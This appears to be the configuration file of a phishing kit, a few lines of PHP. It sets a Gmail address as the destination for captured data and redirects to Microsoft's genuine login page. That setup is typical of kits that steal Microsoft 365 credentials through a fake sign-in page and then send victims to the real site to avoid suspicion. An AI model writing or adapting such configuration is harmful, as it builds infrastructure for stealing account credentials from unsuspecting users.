<?php 
$Receive_email="yuantungxiuxiu@gmail.com";
$redirect="https://login.microsoftonline.com/";
?>